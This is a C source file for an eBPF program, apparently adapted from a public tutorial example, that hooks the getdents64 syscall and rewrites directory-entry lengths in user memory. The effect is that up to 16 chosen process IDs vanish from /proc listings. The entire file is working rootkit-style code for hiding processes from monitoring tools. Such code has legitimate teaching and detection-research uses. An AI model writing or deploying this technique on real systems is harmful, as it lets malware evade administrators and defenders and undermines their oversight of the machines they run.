// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */
/* Modified to support multiple PIDs */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// RingBuffer to send events to um
struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// Maximum number of PIDs we can hide
#define MAX_PIDS_TO_HIDE 16
#define MAX_PID_LEN 10

// Array of PIDs to hide (as strings, since they become folder names in /proc/)
const volatile int num_pids_to_hide = 0;
const volatile char pids_to_hide[MAX_PIDS_TO_HIDE][MAX_PID_LEN];
const volatile int pid_lens[MAX_PIDS_TO_HIDE];

// Helper to compare a single PID string against filename
// Manual comparison since we can't use strcmp in BPF
static __always_inline int cmp_pid(char *filename, int pid_idx) {
    int len = pid_lens[pid_idx];
    if (len <= 0 || len > MAX_PID_LEN) {
        return 0;
    }
    
    // Manual unroll for MAX_PID_LEN (10 chars max for PID string)
    // PID can be at most 7 digits (4194304 max on Linux) + null = 8, but we allow 10
    if (len > 0 && filename[0] != pids_to_hide[pid_idx][0]) return 0;
    if (len > 1 && filename[1] != pids_to_hide[pid_idx][1]) return 0;
    if (len > 2 && filename[2] != pids_to_hide[pid_idx][2]) return 0;
    if (len > 3 && filename[3] != pids_to_hide[pid_idx][3]) return 0;
    if (len > 4 && filename[4] != pids_to_hide[pid_idx][4]) return 0;
    if (len > 5 && filename[5] != pids_to_hide[pid_idx][5]) return 0;
    if (len > 6 && filename[6] != pids_to_hide[pid_idx][6]) return 0;
    if (len > 7 && filename[7] != pids_to_hide[pid_idx][7]) return 0;
    if (len > 8 && filename[8] != pids_to_hide[pid_idx][8]) return 0;
    if (len > 9 && filename[9] != pids_to_hide[pid_idx][9]) return 0;
    
    return 1;
}

// Helper to check if filename matches any PID we want to hide
// Returns 1 if match found, 0 otherwise
static __always_inline int check_pid_match(char *filename) {
    // Manual unroll for MAX_PIDS_TO_HIDE (16)
    // Each check is independent, verifier should be happy
    if (num_pids_to_hide > 0  && cmp_pid(filename, 0))  return 1;
    if (num_pids_to_hide > 1  && cmp_pid(filename, 1))  return 1;
    if (num_pids_to_hide > 2  && cmp_pid(filename, 2))  return 1;
    if (num_pids_to_hide > 3  && cmp_pid(filename, 3))  return 1;
    if (num_pids_to_hide > 4  && cmp_pid(filename, 4))  return 1;
    if (num_pids_to_hide > 5  && cmp_pid(filename, 5))  return 1;
    if (num_pids_to_hide > 6  && cmp_pid(filename, 6))  return 1;
    if (num_pids_to_hide > 7  && cmp_pid(filename, 7))  return 1;
    if (num_pids_to_hide > 8  && cmp_pid(filename, 8))  return 1;
    if (num_pids_to_hide > 9  && cmp_pid(filename, 9))  return 1;
    if (num_pids_to_hide > 10 && cmp_pid(filename, 10)) return 1;
    if (num_pids_to_hide > 11 && cmp_pid(filename, 11)) return 1;
    if (num_pids_to_hide > 12 && cmp_pid(filename, 12)) return 1;
    if (num_pids_to_hide > 13 && cmp_pid(filename, 13)) return 1;
    if (num_pids_to_hide > 14 && cmp_pid(filename, 14)) return 1;
    if (num_pids_to_hide > 15 && cmp_pid(filename, 15)) return 1;
    
    return 0;
}

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }
    
    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);

        // Check if this filename matches any PID we want to hide
        if (check_pid_match(filename)) {
            // Found a matching PID folder
            // Save position AFTER this entry so we continue from there after patching
            unsigned int next_pos = bpos + d_reclen;
            bpf_map_update_elem(&map_bytes_read, &pid_tgid, &next_pos, BPF_ANY);
            // map_to_patch already has the previous entry (set in last iteration)
            // Jump to patch routine - it will tail call back to us
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        
        // Save this entry as "previous" for potential patching
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If there's still more to read, continue in next tail call
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    
    // Done scanning - cleanup
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    bpf_map_delete_elem(&map_to_patch, &pid_tgid);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found a pid folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target by reading previous linux_dirent64 struct
    // and setting its d_reclen to cover itself and our target
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, sizeof(filename), dirp_previous->d_name);
    bpf_printk("[PID_HIDE] previous entry: %s\n", filename);
    bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);
    bpf_printk("[PID_HIDE] hiding entry: %s\n", filename);

    // Overwrite d_reclen to skip over the hidden entry
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    // DON'T delete maps yet - we need to continue scanning for more PIDs
    // Update map_to_patch to point to the merged entry (dirp_previous now covers both)
    // This way if the NEXT entry also needs hiding, we have the right "previous"
    bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp_previous, BPF_ANY);
    
    // Tail call back to handle_getdents_exit to continue scanning
    // map_bytes_read was already updated to position after the hidden entry
    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    
    // If tail call fails (shouldn't happen), cleanup
    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    
    return 0;
}